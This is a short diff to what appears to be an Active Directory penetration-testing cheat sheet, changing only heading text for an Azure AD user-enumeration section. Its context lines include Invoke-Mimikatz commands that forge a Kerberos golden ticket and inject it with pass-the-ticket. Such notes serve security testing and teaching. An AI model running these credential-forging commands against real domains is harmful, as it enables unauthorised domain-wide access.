@@ -242,9 +242,9 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domaine.
 Invoke-Mimikatz -Command '"kerberos::ptt C:\path\krb_tgt.kirbi
 
   
-## Azure Active Directory :
+## Azure Active Directory
 
-### User Enumeration :
+### AZ User Enumeration
 
 First, we connect to Azure Active Directory with **Connect-MsolService**.
 ```powershell
